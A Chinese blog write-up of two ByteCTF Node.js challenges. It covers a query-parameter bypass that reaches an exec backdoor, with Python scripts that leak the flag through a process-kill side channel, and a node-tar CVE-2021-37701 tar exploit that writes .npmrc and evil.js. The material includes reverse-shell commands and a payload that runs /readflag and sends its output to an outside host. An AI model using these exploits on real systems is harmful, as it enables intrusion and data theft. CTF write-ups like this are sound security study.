# 记ByteCTF中的Node题
我总觉得字节是跟`Node`过不去了，初赛和决赛都整了个`Node`题目，当然`PHP`、`Java`都是必不可少的，只是我觉得`Node`类型的比较少见，所以感觉挺新鲜的。

## Nothing

决赛的`Node`题型，题目如下：
```
Can you get flag in a fully enclosed nodejs environment?

http://39.106.69.116:30001
http://39.106.34.228:30001
```
直接访问`http://39.106.34.228:30001/`就会得到一句话`Here is a backdoor,can you shell it and get the flag?`，访问`http://39.106.34.228:30001/source`可以得到相关的源码。

```javascript
const express = require('express')
const fs = require('fs')
const exec = require('child_process').exec;
const src = fs.readFileSync("app.js")
const app = express()

app.get('/', (req, res) => {
    if (!('ByteCTF' in req.query)) {
        res.end("Here is a backdoor,can you shell it and get the flag?")
        return
    }

    if (req.query.ByteCTF.length > 3000) {
        const byteCTF = JSON.stringify(req.query.ByteCTF)
        if (byteCTF.length > 1024) {
            res.end("too long.")
            return
        }

        try {
            const q = "{" + req.query.ByteCTF + "}"
            res.end("Got it!")
        } catch {
            if (req.query.backdoor) {
                exec(req.query.backdoor)
                res.send("exec complete,but nothing here")
            } else {
                res.end("Nothing here!")
            }
        }
    } else {
        res.end("too short.")
        return
    }
})

app.get('/source', (req, res) => {
    res.end(src)
});

app.listen(3000, () => {
  console.log(`listening at port 3000`)
}) 
```

可以看到有个`exec`可以执行命令，然后就是经典的绕过环节了，首先看第一个需要他的长度大于`3000`并且`JSON.stringify`后要小于`1024`，这可让我犯了难，然后表哥们说这玩意可以直接传对象，带着`length`属性值大于`3000`就行，好家伙之前我还不知道`express`可以直接传递对象上去，那么就先在本地跑跑看看，首先将代码保存成`app.js`，然后本地目录运行命令即可。

```shell
$ npm install express
$ node app.js
```

然后可以打印一下`req.query.ByteCTF`尝试一下，然后我们访问`http://localhost:3000/?ByteCTF[a]=1&ByteCTF[b]=2`，就可以得到一个对象的输出。

```javascript
// http://localhost:3000/?ByteCTF[a]=1&ByteCTF[b]=2
// too short.
{ a: '1', b: '2' }
```

既然他能够被转换为对象，那么就直接写一个带`length`属性的对象进去，让他检查`length`的时候大于`3000`即可。

```javascript
// http://localhost:3000/?ByteCTF[__proto__][length]=100000&ByteCTF[a]=1
// Got it!
{ a: '1' }
```

可以看到输出的是`Got it!`，也就是能够成功执行到`res.end("Got it!")`这一行了，现在只需要让这个对象在拼接字符串的时候抛出异常就可以了，在`js`中对象转成字符串也是调用的`toString`方法，既然传递的是对象就完全可以将这个方法给他覆盖掉，直接传递一个值即可，因为传递的不是函数，而拼接的时候会尝试调用这个`toString`函数所以会抛出异常。

```javascript
// http://localhost:3000/?ByteCTF[__proto__][length]=100000&ByteCTF[a]=1&ByteCTF[toString]=1
// 抛出的异常是 TypeError: Cannot convert object to primitive value
// Nothing here!
```

可以看到输出是`Nothing here!`，之后我们只需要传递一个`backdoor`的`param`参数去执行命令就可以了。


```javascript
// http://localhost:3000/?ByteCTF[__proto__][length]=100000&ByteCTF[a]=1&ByteCTF[toString]=1&backdoor=echo%201
// exec complete,but nothing here
```

事情到这里看起来似乎是挺顺利，当然只是看起来，起初我还没能理解题目中`fully enclosed`是个嘛意思，然后尝试了一下`nc -e /bin/bash {host} {port}`去反弹`shell`，半天也没反应，想来可能发行版没有`-e`参数，于是就尝试`bash -i >& /dev/tcp/{host}/{port} 0>&1`，也没弹出来，然后看了看我机器的`nc -lvvp {port}`似乎也没问题，然后就去尝试了一下`dnslog`，然后尝试了`curl`和`ping`都收不到记录，然后我就理解了这个`fully enclosed`完全封闭是什么意思了，好家伙靶机不出网，这跟我玩蛇，现在是可以`RCE`但是拿不到东西，真难受。然后我想的是既然他得用`node`服务，能不能把这个`node`进程杀死然后用这个端口去通信，或者检测一下还有没有可以用的端口。然后队友表哥们玩了一个新花样，好家伙给我看傻眼了。 

先说点别的，之前看到过一个代码，具体的细节我不太记得清了，~~大概是这样的~~，找到原文链接了，在参考栏里，在这里基本就搬运一下了。

```java
boolean safeEqual(String a, String b) {
   if (a == null || b == null) {
       return a == b;
   }
   if (a.length() != b.length()) {
       return false;
   }
   int equal = 0;
   for (int i = 0; i < a.length(); i++) {
       equal |= a.charAt(i) ^ b.charAt(i);
   }
   return equal == 0;
}
```

这个函数的功能是比较两个字符串是否相等，首先长度不等结果肯定不等，立即返回这个很好理解。再看看后面的，稍微动下脑筋，转弯下也能明白这其中的门道：通过异或操作`1^1=0`、`1^0=1`、`0^0=0`，来比较每一位，如果每一位都相等的话，两个字符串肯定相等，最后存储累计异或值的变量`equal`必定为`0`，否则为`1`。但是
从效率角度上讲，难道不是应该只要中途发现某一位的结果不同了(即为`1`)就可以立即返回两个字符串不相等了吗，类似与下边这样。

```java
for (int i = 0; i < a.length(); i++) {
    if (a.charAt(i) ^ b.charAt(i) != 0) // or a.charAt(i) != b.charAt(i)
        return false;
}
```
以前知道通过延迟计算等手段来提高效率的手段，但这种已经算出结果却延迟返回的，还是头一回，结合方法名称`safeEquals`可能知道些眉目，与安全有关，其实`JDK`中也有类似的方法，例如`java.security.MessageDigest`，看注释知道了目的是为了用常量时间复杂度进行比较。

```java
public static boolean isEqual(byte[] digesta, byte[] digestb) {
   if (digesta == digestb) return true;
   if (digesta == null || digestb == null) {
       return false;
   }
   if (digesta.length != digestb.length) {
       return false;
   }

   int result = 0;
   // time-constant comparison
   for (int i = 0; i < digesta.length; i++) {
       result |= digesta[i] ^ digestb[i];
   }
   return result == 0;
}
```

实际上，这么做是为了防止计时攻击，计时攻击是边信道攻击(或称侧信道攻击，`Side Channel Attack`，简称`SCA`) 的一种，边信道攻击是一种针对软件或硬件设计缺陷，走歪门邪道的一种攻击方式。  

然后表哥们就玩了一个花里胡哨的侧信道方案，首先既然无法出网，就需要知道一个服务器的状态，而表哥们选用的服务器状态，就是这个`node`进程是否还活着，整体思路就是，首先在根目录去读文件，`flag`大概率是在文件中的，通过执行`ls /`获得一个输出的字符串，然后我我们传递进去一段代码，如果这个字符与我们传进去的字符相同，就杀死这个`node`进程，然后我们就访问不到服务了，然后就可以断定这个字符是正确的，而传入的字符就只能一个个遍历了。首先我们需要遍历出来存放`flag`的文件，直接上代码，这实际上也算是一种爆破方案，在尝试的过程中也会出现一些状况，因为靶机的`node`重启太快了刚杀死就重启了，所以需要不少人工因素查看，有时候会顿一下多看几次都在那里停顿大概率就是那个字符了了，多看几遍可以排除下网络波动因素。

```python
# blast_file_name.py 爆破文件名

import requests
from urllib import parse
import base64
from time import sleep
import string

# url = "http://39.106.69.116:30001/"
url = "http://39.106.34.228:30001/"

template = '''
    const exec = require("child_process").exec;
    const fs = require("fs");
    const cmd = "ls /";

    exec(cmd, function(error, stdout, stderr) {{ 
        if(stdout[{0}]==="{1}" && stdout.substr(0,{0})==="{2}"){{
            exec("pkill node");
        }}
    }});
'''


def remote_exec(command):
    params = "echo {} | base64 -d > /tmp/ddd.js;node /tmp/ddd.js".format(base64.b64encode(t.encode()).replace(b'\n',b'').decode())
    # print(params)
    requests.get(url +"?ByteCTF[__proto__][length]=100000&ByteCTF[toString]=&ByteCTF[][a]&backdoor="+parse.quote(params))

if __name__ == "__main__":
    # 例如搜索出了出了第四位字符 
    # 那么第三位大概率是正确的 
    # 需不少人工判断
    result = ""
    result = "T"
    result = "Th1s_1s"
    for i in range(len(result), 10000000):
        find = False
        for char in string.ascii_letters + "_- " + string.digits:
            print(i, len(result), char, result + char)
            t = template.format(len(result), char, result)
            # print(t)

            try:
                remote_exec(t)
            except:
                continue

            try:
                requests.get(url, timeout=5)
                requests.get(url, timeout=5)
                requests.get(url, timeout=5)
            except:
                find = True
                result += char
                print(result)
                sleep(5)
                break

        if not find:
            result += ""
```

而恰好第一个文件名就是`flag`的存放位置，感觉路子应该差不多，另外这个文件名稍微爆出来几位之后就可以使用`cat xxx*`去表示了，在这里爆破了`Th1s_1s`，那么之后爆破`flag`就可以使用`cat Th1s_1s*`打开文件，然后继续遍历爆破了，最后得到`flag`为`bytectf{50579195da002fa989432cbc1a83e38f5d3765122d9a7d4d767f99a61fa58f22}`，真的是够长，爆破也需要很长时间费很大劲。

```python
# blasting_flag.py 爆破`flag`

import requests
from urllib import parse
import base64
from time import sleep
import string

# url = "http://39.106.69.116:30001/"
url = "http://39.106.34.228:30001/"

template = '''
    const exec = require("child_process").exec;
    const fs = require("fs");
    const cmd = "cat /Th1s_1s*";

    exec(cmd, function(error, stdout, stderr) {{ 
        if(stdout[{0}]==="{1}" && stdout.substr(0,{0})==="{2}"){{
            exec("pkill node");
        }}
    }});
'''


def remote_exec(command):
    params = "echo {} | base64 -d > /tmp/hhh.js;node /tmp/hhh.js".format(base64.b64encode(t.encode()).replace(b'\n',b'').decode())
    # print(params)
    requests.get(url +"?ByteCTF[__proto__][length]=100000&ByteCTF[toString]=&ByteCTF[][a]&backdoor="+parse.quote(params))

if __name__ == "__main__":
    # 例如搜索出了出了第四位字符 那么第三位大概率是正确的 
    # 需要不少人工因素 有时候会顿一下多看几次都在那里停顿大概率就是了 因为node重启太快了 多看几遍可以排除下网络波动因素
    result = ""
    result = "by"
    result = "bytectf{50579195da002fa989432cbc1a83e38f5d3765122d9a7d4d767f99a61fa58f22"
    for i in range(len(result), 10000000):
        find = False
        # for char in string.ascii_letters:
        for char in string.ascii_letters + "{_- }" + string.digits:
            print(i, len(result), char, result + char)
            t = template.format(len(result), char, result)
            # print(t)

            try:
                remote_exec(t)
            except:
                continue

            try:
                requests.get(url, timeout=1)
                requests.get(url, timeout=1)
                requests.get(url, timeout=1)
            except:
                find = True
                result += char
                print(result)
                sleep(5)
                break

        if not find:
            result += ""

# bytectf{50579195da002fa989432cbc1a83e38f5d3765122d9a7d4d767f99a61fa58f22}
```

## easy_extract
这是初赛的`Node`题型，当时没搞出来，这是决赛之后看到了上边的`Node`题目所以也记录了一下。当时搞出了文件写入，然后没有多少地方有写权限，没想到利用写`.npmrc`文件并重启搞他。下面的内容来自于官方的`Writeup`，仅作记录，详情链接在参考中。

本题利用的是`8`月份曝出的`node-tar`包符号链接检查绕过漏洞，这个漏洞本身在网上是可以找到`POC`的，能够做到任意文件写入，同时本题展示文件列表的功能结合符号链接可以被用来列目录，辅助判断题目环境，不过为了难度考虑，还是在`/robots.txt`中将`Dockerfile`放出，能够得到一些关于题目是如何启动的信息，同时，本题也考察了在没有`web`应用目录写入权限的情况下，通过任意文件写来进一步造成`RCE`的一些思路。  
`CVE-2021-37701 node-tar`任意文件写入`/`覆盖漏洞(翻译自原报告)`node-tar`有安全措施，旨在保证不会提取任何位置将被符号链接修改的文件，这部分是通过确保提取的目录不是符号链接来实现的，此外，为了防止不必要的`stat`调用来确定给定路径是否为目录，在创建目录时会缓存路径，但是`6.1.7`以下版本的`node-tar`当提取包含一个目录及与目录同名的符号链接的`tar`文件时，此检查逻辑是不够充分的，其中存档条目中的符号链接和目录名称在`posix`系统上使用反斜杠作为路径分隔符，缓存检查逻辑同时使用了和`/`字符作为路径分隔符，然而，在`posix`系统上是一个有效的文件名字符，通过首先创建一个目录，然后用符号链接替换该目录，可以绕过对目录的符号链接检查，基本上允许不受信任的`tar`文件符号链接到任意位置，然后将任意文件提取到该位置，从而允许任意文件创建和覆盖，此外，不区分大小写的文件系统可能会出现类似的混淆，如果恶意`tar`包含一个位于`FOO`的目录，后跟一个名为`foo`的符号链接，那么在不区分大小写的文件系统上，符号链接的创建将从文件系统中删除该目录，但不从内部目录中删除缓存，因为它不会被视为缓存命中，`FOO`目录中的后续文件条目将被放置在符号链接的目标中，认为该目录已经创建，关于`POC`的构建，也有相关文章可以参考`: 5 RCEs in npm for $15, 000`。于是我们简单尝试一下，但在上传时，我们会发现文件大小存在限制，而一般来讲`tar`打包出来的文件都会大于`1KB`，所以可以打包一个`.tar.gz`，并将扩展名改回`.tar`，实际上`node-tar`并不根据扩展名判断文件是否压缩，所以`.tar`后缀的`.tar.gz`文件是可以被正常解压的，可以发现确实创建了一个指向`/app/data`以外的符号链接，能够列出全盘的路径信息: 

```bash
#!/bin/sh

rm n\\x

ln -s / n\\x # Create a link to the destination dir
tar cf poc.tar n\\x # Pack the link into the tar

echo "test" > n\\x/app/data/test
tar rf poc.tar n\\x n\\x/app/data/test

gzip -9 < poc.tar > poc.tar.gz
rm poc.tar
mv poc.tar.gz poc.tar
```

做完这一步，就可以任意列目录，并且任意写入文件了，根目录下有`/readflag`，说明需要命令执行。

从`Dockerfile`可以看出，我们的用户是`node`，基本上没有多少地方有写权限，并且`app`目录除了`/app/data`都是无权限写的，观察启动参数，`nodemon --exec npm start`有些奇怪，查资料发现`nodemon`是一个开发使用的工具，会在`/app`目录下发生文件创建或更改时自动重启`node`，于是想到，我们还可以在用户文件夹下写入配置文件，让配置文件在`node`重启时被加载，这时我们注意到服务是用`npm start`起的，所以可以通过写入`~/.npmrc`的`NODE_OPTIONS`参数造成`RCE`。

```bash
echo "node-options='--require /home/node/evil.js'" > /home/node/.npmrc
```

之后，写入一个`.js`文件到`/app/data`下面，即可触发`nodemon`重启`node`，进而导致`evil.js`被执行，`nodemon`这层主要是方便比赛，实际上如果是在真实环境里，大概率不会有人使用`nodemon`启动生产环境的服务，不过我们仍然可以先将文件写入，之后守株待兔直到服务重启，命令被执行，在配置了重启策略的`Docker`容器中，也可以通过把服务打挂的方式强制重启。

```bash
#!/bin/sh

# Generate Tar
mkdir /home/node
ln -s /home/node/ n\\x
tar cf exp.tar n\\x
echo "node-options='--require /home/node/evil.js'" > n\\x/.npmrc
echo "const execSync = require('child_process').execSync;const http = require('http');const output = execSync('/readflag', { encoding: 'utf-8' });http.get('http://ent9hso2vt0z.x.pipedream.net/?'+output);" > n\\x/evil.js
echo "dummy" > test.js
tar rf exp.tar n\\x n\\x/.npmrc n\\x/evil.js test.js

# Compress
gzip -9 < exp.tar > exp.tar.gz
mv exp.tar.gz exp.tar

# Clean Up
rm n\\x/.npmrc n\\x/evil.js test.js n\\x
rm -r /home/node
```

## 参考
```
https://www.zhihu.com/question/275611095/answer/1962679419
https://bytedance.feishu.cn/docs/doccntSbxsYPGEXw7wLP0TY73df
https://bytectf.feishu.cn/docs/doccnq7Z5hqRBMvrmpRQMAGEK4e#lLBgbe
```